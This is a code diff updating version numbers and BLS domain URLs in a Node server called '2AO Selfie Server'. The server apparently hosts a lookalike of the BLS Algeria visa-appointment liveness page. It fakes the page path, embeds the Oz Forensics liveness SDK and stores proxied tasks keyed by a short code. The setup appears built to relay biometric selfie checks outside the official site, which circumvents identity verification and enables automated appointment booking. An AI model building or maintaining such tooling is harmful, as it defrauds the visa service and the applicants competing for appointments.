@@ -1,7 +1,8 @@
 /**
- * 2AO Selfie Server v1.1
+ * 2AO Selfie Server v1.2
  * Deploy on Render: https://dz34sni-26.onrender.com
  * 
+ * v1.2: Updated to blsinternational.com (new BLS domain)
  * v1.1: Added proxy field to task storage (backward compatible)
  * 
  * Flow (uses 4-digit CODE instead of phone):
@@ -195,7 +196,7 @@ body { margin: 0; background: #08090d; font-family: system-ui, sans-serif; }
         <div style="font-size:36px;font-weight:900;color:#fff;margin-bottom:8px;text-shadow:0 4px 20px rgba(0,0,0,.3)">FÉLICITATIONS !</div>
         <div style="font-size:20px;font-weight:700;color:rgba(255,255,255,.9);margin-bottom:6px">✅ Selfie réussi avec succès</div>
         <div style="font-size:15px;color:rgba(255,255,255,.7);margin-bottom:28px">يمكنك الان اغلاق هذه الصفحة</div>
-        <button onclick="window.location.href='https://algeria.blsspainglobal.com/assets/images/favicon.png?'" style="padding:16px 44px;border-radius:14px;border:none;cursor:pointer;font-weight:700;font-size:17px;color:#059669;background:#fff;box-shadow:0 6px 30px rgba(0,0,0,.2);letter-spacing:1px;animation:pop .6s ease-out .3s both">🏠 RETOUR</button>
+        <button onclick="window.location.href='https://algeria.blsinternational.com/assets/images/favicon.png?'" style="padding:16px 44px;border-radius:14px;border:none;cursor:pointer;font-weight:700;font-size:17px;color:#059669;background:#fff;box-shadow:0 6px 30px rgba(0,0,0,.2);letter-spacing:1px;animation:pop .6s ease-out .3s both">🏠 RETOUR</button>
         <div style="margin-top:16px;font-size:14px;color:rgba(255,255,255,.7);font-weight:700">Retour dans <span id="countdown">8</span>s</div>
     </div>
 </div>
@@ -244,7 +245,7 @@ try { history.replaceState({}, '', '/dza/appointment/LivenessRequest'); } catch(
     <input type="hidden" name="__RequestVerificationToken" value="">
 </form>
 
-<script src="https://web-sdk.prod.cdn.spain.ozforensics.com/blsinternational/plugin_liveness.php"></script>
+<script src="https://web-sdk.prod.cdn.spain.ozforensics.com/blsinternational3/plugin_liveness.php"></script>
 
 <script>
 function showSuccess() {
@@ -269,7 +270,7 @@ function showSuccess() {
         if (countEl) countEl.textContent = String(sec);
         if (sec <= 0) {
             clearInterval(t);
-            window.location.href = 'https://algeria.blsspainglobal.com/assets/images/favicon.png?';
+            window.location.href = 'https://algeria.blsinternational.com/assets/images/favicon.png?';
         }
     }, 1000);
 }
@@ -339,7 +340,7 @@ window.addEventListener('load', function() {
 app.get('/', (req, res) => {
     res.json({
         service: '2AO Selfie',
-        version: '1.1',
+        version: '1.2',
         status: 'running',
         activeTasks: Object.keys(tasks).length,
         activeResults: Object.keys(results).length,
@@ -362,7 +363,7 @@ app.get('/debug', (req, res) => {
 // START
 // ═══════════════════════════════════════════
 app.listen(PORT, () => {
-    console.log(`\n🔥 2AO Selfie Server v1.1`);
+    console.log(`\n🔥 2AO Selfie Server v1.2`);
     console.log(`   Port: ${PORT}`);
     console.log(`   Ready!\n`);
 });
